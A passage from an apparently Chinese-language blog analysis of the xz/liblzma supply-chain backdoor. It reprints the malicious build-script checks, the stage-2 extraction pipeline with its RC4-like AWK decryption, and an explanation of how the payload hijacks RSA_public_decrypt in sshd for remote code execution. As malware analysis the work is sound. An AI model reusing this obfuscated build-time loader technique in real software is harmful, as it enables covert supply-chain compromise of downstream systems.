<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> ! <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;^x86_64&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$build</span><span class="s2">&#34;</span> <span class="p">|</span> grep -Eq <span class="s2">&#34;linux-gnu</span>$<span class="s2">&#34;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span><span class="p">;</span><span class="k">then</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p>如果 amd64/x86_64 是构建的目标</p>
</li>
<li>
<p>如果目标使用名称 <code>linux-gnu</code> （主要是检查是否使用了 glibc）</p>
</li>
</ul>
<p>它还会检查正在使用的工具链：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$GCC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xyes&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$CC</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s1">&#39;xgcc&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nv">LDv</span><span class="o">=</span><span class="nv">$LD</span><span class="s2">&#34; -v&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> ! <span class="nv">$LDv</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -qs <span class="s1">&#39;GNU ld&#39;</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">exit</span> <span class="m">0</span></span></span></code></pre></td></tr></table>
</div>
</div><p>如果正在尝试复现构建 Debian 或 Red Hat 软件包：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> -f <span class="s2">&#34;</span><span class="nv">$srcdir</span><span class="s2">/debian/rules&#34;</span> <span class="o">||</span> <span class="nb">test</span> <span class="s2">&#34;x</span><span class="nv">$RPM_ARCH</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;xx86_64&#34;</span><span class="p">;</span><span class="k">then</span></span></span></code></pre></td></tr></table>
</div>
</div><p>因此，这种攻击似乎是针对使用 Debian 或 Red Hat 派生发行版运行 glibc 的 amd64 系统。</p>
<p>其他系统目前可能容易受到攻击，但没有明确的证据。</p>
<h4 id="后门提取" class="heading-element"><span>后门提取</span>
  <a href="#%e5%90%8e%e9%97%a8%e6%8f%90%e5%8f%96" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>正如 Andres 在原始电子邮件中指出的那样，在某些时候会提取 .o 文件并将其编织到编译/链接过程中。由以下代码负责</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nv">W</span><span class="o">=</span><span class="m">88664</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="nv">N</span><span class="o">=</span><span class="m">88664</span>
</span></span><span class="line"><span class="cl"><span class="nv">W</span><span class="o">=</span><span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">xz -dc <span class="nv">$top_srcdir</span>/tests/files/<span class="nv">$p</span> <span class="p">|</span> <span class="nb">eval</span> <span class="nv">$i</span> <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C sed <span class="s2">&#34;s/\(.\)/\1\n/g&#34;</span> <span class="p">|</span> <span class="nv">LC_ALL</span><span class="o">=</span>C awk <span class="s1">&#39;BEGIN{FS=&#34;\n&#34;;RS=&#34;\n&#34;;ORS=&#34;&#34;;m=256;for(i=0;i&lt;m;i++){t[sprintf(&#34;x%c&#34;,i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l&lt;8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t[&#34;x&#34; (NF&lt;1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf &#34;%c&#34;,(v+k)%m}&#39;</span> <span class="p">|</span> xz -dc --single-stream <span class="p">|</span> <span class="o">((</span>head -c +<span class="nv">$N</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> head -c +<span class="nv">$W</span><span class="o">)</span> &gt; liblzma_la-crc64-fast.o <span class="o">||</span> true</span></span></code></pre></td></tr></table>
</div>
</div><p>版本之间的差异归结为有损压缩(compressed-but-somewhat-mangled)的有效负载的大小，在 5.6.0 中是 88792，在 5.6.1 中是 88664，AWK 脚本中的一个值发生了变化，我们稍后会介绍这一点。</p>
<p>实际上某些步骤与Stage 1相同（它的二进制 payload 在“good”文件数据中先前被忽略的部分中）。</p>
<ol>
<li>
<p>与Stage 1 中的步骤 2 相同，用xz解压 tests/files/good-large_compressed.lzma 文件</p>
</li>
<li>
<p>与Stage 1 中的步骤 3 相同，即“很多 head 函数”调用。</p>
</li>
<li>
<p>这有不同了。首先之前的输出被 sed 命令破坏了。<code>LC_ALL=C sed &quot;s/\(.\)/\1\n/g&quot;</code> 其作用实际上是在每个字节后面放置一个换行符（换行符本身除外）。因此，我们最终在输出中得到的是每行字节的情况（这里有很多混合“文本”和“二进制”文件）。这正是下一步所需要的。</p>
</li>
<li>
<p>下一步是 AWK 脚本，它对输入流进行 <a href="https://en.wikipedia.org/wiki/RC4"target="_blank" rel="external nofollow noopener noreferrer">RC4&hellip;ish</a> 描述。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">BEGIN <span class="o">{</span>  <span class="c1"># Initialization part.</span>
</span></span><span class="line"><span class="cl">  <span class="nv">FS</span> <span class="o">=</span> <span class="s2">&#34;\n&#34;</span><span class="p">;</span>  <span class="c1"># Some AWK settings.</span>
</span></span><span class="line"><span class="cl">  <span class="nv">RS</span> <span class="o">=</span> <span class="s2">&#34;\n&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">ORS</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">m</span> <span class="o">=</span> 256<span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="o">(</span><span class="nv">i</span><span class="o">=</span>0<span class="p">;</span>i&lt;m<span class="p">;</span>i++<span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    t<span class="o">[</span>sprintf<span class="o">(</span><span class="s2">&#34;x%key&#34;</span>, i<span class="o">)]</span> <span class="o">=</span> i<span class="p">;</span>
</span></span><span class="line"><span class="cl">    key<span class="o">[</span>i<span class="o">]</span> <span class="o">=</span> <span class="o">((</span>i * 7<span class="o">)</span> + 5<span class="o">)</span> % m<span class="p">;</span>  <span class="c1"># Creating the cipher key.</span>
</span></span><span class="line"><span class="cl">  <span class="o">}</span>
</span></span><span class="line"><span class="cl">  <span class="nv">i</span><span class="o">=</span>0<span class="p">;</span>  <span class="c1"># Skipping 4096 first bytes of the output PRNG stream.</span>
</span></span><span class="line"><span class="cl">  <span class="nv">j</span><span class="o">=</span>0<span class="p">;</span>  <span class="c1"># ↑ it&#39;s a typical RC4 thing to do.</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="o">(</span><span class="nv">l</span> <span class="o">=</span> 0<span class="p">;</span> l &lt; 4096<span class="p">;</span> l++<span class="o">)</span> <span class="o">{</span>  <span class="c1"># 5.6.1 uses 8192 instead.</span>
</span></span><span class="line"><span class="cl">    <span class="nv">i</span> <span class="o">=</span> <span class="o">(</span>i + 1<span class="o">)</span> % m<span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">a</span> <span class="o">=</span> key<span class="o">[</span>i<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">j</span> <span class="o">=</span> <span class="o">(</span>j + a<span class="o">)</span> % m<span class="p">;</span>
</span></span><span class="line"><span class="cl">    key<span class="o">[</span>i<span class="o">]</span> <span class="o">=</span> key<span class="o">[</span>j<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    key<span class="o">[</span>j<span class="o">]</span> <span class="o">=</span> a<span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">{</span>  <span class="c1"># Decription part.</span>
</span></span><span class="line"><span class="cl">  <span class="c1"># Getting the next byte.</span>
</span></span><span class="line"><span class="cl">  <span class="nv">v</span> <span class="o">=</span> t<span class="o">[</span><span class="s2">&#34;x&#34;</span> <span class="o">(</span>NF &lt; <span class="m">1</span> ? RS : <span class="nv">$1</span><span class="o">)]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1"># Iterating the RC4 PRNG.</span>
</span></span><span class="line"><span class="cl">  <span class="nv">i</span> <span class="o">=</span> <span class="o">(</span>i + 1<span class="o">)</span> % m<span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">a</span> <span class="o">=</span> key<span class="o">[</span>i<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">j</span> <span class="o">=</span> <span class="o">(</span>j + a<span class="o">)</span> % m<span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">b</span> <span class="o">=</span> key<span class="o">[</span>j<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  key<span class="o">[</span>i<span class="o">]</span> <span class="o">=</span> b<span class="p">;</span>
</span></span><span class="line"><span class="cl">  key<span class="o">[</span>j<span class="o">]</span> <span class="o">=</span> a<span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nv">k</span> <span class="o">=</span> key<span class="o">[(</span>a + b<span class="o">)</span> % m<span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1"># As pointed out by @nugxperience, RC4 originally XORs the encrypted byte</span>
</span></span><span class="line"><span class="cl">  <span class="c1"># with the key, but here for some add is used instead (might be an AWK thing).</span>
</span></span><span class="line"><span class="cl">  <span class="nb">printf</span> <span class="s2">&#34;%key&#34;</span>, <span class="o">(</span>v + k<span class="o">)</span> % m
</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>输入被解密后，这一步进行解压：<code>xz -dc --single-stream</code> ；</p>
</li>
<li>
<p>然后使用head技巧截取从 N (0) 到 W (~86KB) 的字节，并保存为 liblzma_la-crc64-fast.o ，这是最终的二进制后门。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">((</span>head -c +<span class="nv">$N</span> &gt; /dev/null 2&gt;<span class="p">&amp;</span>1<span class="o">)</span> <span class="o">&amp;&amp;</span> head -c +<span class="nv">$W</span><span class="o">)</span> &gt; liblzma_la-crc64-fast.o</span></span></code></pre></td></tr></table>
</div>
</div></li>
</ol>
<p>5.6.0 版本N为0，W为88792</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png?size=small" data-sub-html="<h2>image-20240406215017407</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png" alt="image-20240406215017407" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406215017407.png?size=large 2x" data-title="image-20240406215017407" style="--width: 2224px;--aspect-ratio: 2224 / 394;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="o二进制分析" class="heading-element"><span>.o二进制分析</span>
  <a href="#o%e4%ba%8c%e8%bf%9b%e5%88%b6%e5%88%86%e6%9e%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>这块我不擅长，就不班门弄斧了。</p>
<p>关于.o二进制文件的分析，可以参考<a href="https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504"target="_blank" rel="external nofollow noopener noreferrer">这篇文章</a>，文中对二进制文件中很多函数功能都有相应的推测，可以进行参考。</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-2466330.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-2466330.png?size=small" data-sub-html="<h2>图片</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-2466330.png" alt="图片" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-2466330.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-2466330.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-2466330.png?size=large 2x" data-title="图片" style="--width: 1080px;--aspect-ratio: 1080 / 945;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-20240407130620159.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-20240407130620159.png?size=small" data-sub-html="<h2>图片</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-20240407130620159.png" alt="图片" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-20240407130620159.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-20240407130620159.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640-20240407130620159.png?size=large 2x" data-title="图片" style="--width: 940px;--aspect-ratio: 940 / 1297;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>逆向后的项目，基于xz 5.6.1版本，可见：https://github.com/smx-smx/xzre，该项目是基于xz 5.6.1版本。</p>
<p>国内也有篇文章分析的很好：<a href="https://mp.weixin.qq.com/s/DFXa2DOb2VyxyFFWDRt2Cg"target="_blank" rel="external nofollow noopener noreferrer">XZ开源项目投毒事件深入解析</a></p>
<p>该后门首先在 sshd 启动时替换 <code>crc32_resolve()</code> 和 <code>crc64_resolve</code>，然后试图从内存中解析符号表，并查找 <code>RSA_public_decrypt@....plt</code> 符号，并将其指向的地址替换为后门代码。</p>
<p>在 SSH 登录认证时，sshd 会调用该符号，并在服务器上执行攻击代码。</p>
<h3 id="后门设计分析" class="heading-element"><span>后门设计分析</span>
  <a href="#%e5%90%8e%e9%97%a8%e8%ae%be%e8%ae%a1%e5%88%86%e6%9e%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>此后门程序包含多个组件。在高层次上：</p>
<ul>
<li>上游发布的发布压缩包与 GitHub 的代码不同。这在 C 项目中很常见，因此下游使用者不需要记住如何运行 autotools 和 autoconf。发布版中的压缩包版本 <code>build-to-host.m4</code> 与 GitHub 上的上游版本有很大不同。</li>
<li>git 存储库中的 <code>tests/</code> 文件夹中也有精心设计的测试文件。这些文件位于以下提交中：
<ul>
<li><code>tests/files/bad-3-corrupt_lzma2.xz</code> (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1)</li>
<li><code>tests/files/good-large_compressed.lzma</code> (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1)</li>
</ul>
</li>
<li>由 <code>build-to-host.m4</code> 调用的脚本解压缩此恶意测试数据，并使用它来修改生成过程。</li>
<li>IFUNC 是 glibc 中允许间接函数调用的一种机制，用于执行 OpenSSH 身份验证例程的运行时挂钩/重定向。IFUNC 是一种通常用于合法事物的工具，但在这种情况下，它被用于此攻击路径。</li>
</ul>
<p>通常，上游发布的 tarball 与 GitHub 中自动生成的 tarball 不同。在这些修改后的 tarball 中，包含一个恶意版本 <code>build-to-host.m4</code> ，用于在构建过程中执行脚本。</p>
<p>整起事件隐匿的很好，从用于存储payload的二进制测试文件，到文件内容雕刻、替换密码和 AWK 中实现的 RC4 变体，所有这些都只需使用标准命令行工具即可完成。</p>
<p>所有这一切都在 3 个执行阶段中进行，并通过“扩展”系统实现面向未来的事物，而不必再次更改二进制测试文件。</p>
<h3 id="payload-分析" class="heading-element"><span>payload 分析</span>
  <a href="#payload-%e5%88%86%e6%9e%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>如果上述后门条件得到满足，payload将运行并注入到源代码树中。以下是我所知道的主要内容：</p>
<ul>
<li>如果正在运行的程序具有进程名称 <code>/usr/sbin/sshd</code> ，则payload将激活。</li>
<li>它也可能在其他场景中激活，甚至可能与 ssh 无关。</li>
<li>暂不清楚有效载荷的目的是做什么，正在调查。</li>
<li>Vanilla 上游 OpenSSH 不受影响，除非其依赖项链接 <code>liblzma</code> 之一。
<ul>
<li>Lennart Poettering 曾提到它可能通过 pam-&gt;libselinux-&gt;liblzma 发生，也可能在其他情况下发生，但是&hellip;&hellip;</li>
<li>libselinux 没有链接到 liblzma。事实证明，这种混淆是因为 Fedora 中一个旧的仅限下游的补丁和 RPM 规范中陈旧的依赖关系，这种依赖关系在删除后很长一段时间内仍然存在。</li>
<li>PAM 模块在进程 AFAIK 中加载得太晚，无法正常工作（另一个可能的例子是 <code>pam_fprintd</code> ）。Solar Designer 在 oss-security 上也提出了这个问题。</li>
</ul>
</li>
<li>payload被间接加载到 <code>sshd</code> 。 <code>sshd</code> 通常被 patch 以支持 systemd-notify，以便在 SSHD 运行时可以启动其他服务。 加载<code>liblzma</code>是因为它被 <code>libsystemd</code> 的其他部分所依赖，这不是systemd的错。大多数发行版使用的补丁都可以在这里找到：openssh/openssh-portable#375。
<ul>
<li>更新：OpenSSH开发人员正在考虑添加systemd-notify协议的非库集成，这意味着发行版将不再支持 patch <code>libsystemd</code> 。</li>
</ul>
</li>
<li>如果此payload加载到 openssh 的<code>sshd</code> 中，则该 <code>RSA_public_decrypt</code> 函数将被重定向到恶意实现中。这种恶意实现可用于绕过身份验证。
<ul>
<li>Filippo Valsorda 分享的<a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b"target="_blank" rel="external nofollow noopener noreferrer">分析</a>表明，攻击者必须提供一个由payload验证的密钥，然后将攻击者的输入传递给 <code>system()</code> ，从而提供远程代码执行 （RCE）。</li>
</ul>
</li>
</ul>
<p>关于更多Payload分析，可以关注些大佬们的进度和项目情况：</p>
<ul>
<li>Filippo Valsorda 的分析线程：https://bsky.app/profile/did:plc:x2nsupeeo52oznrmplwapppl/post/3kowjkx2njy2b</li>
<li>通过 @smx-smx （WIP） 进行 XZ 后门分析：https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504</li>
<li>modify_ssh_rsa_pubkey.py by @keeganyan - 脚本来触发受感染 <code>sshd</code> 的有效负载的更多部分</li>
<li>xz-恶意软件https://github.com/karcherm/xz-malware</li>
<li>xz-后门https://github.com/hamarituc/xz-backdoor</li>
</ul>
<h3 id="xz-bits" class="heading-element"><span>xz bits</span>
  <a href="#xz-bits" class="heading-mark">
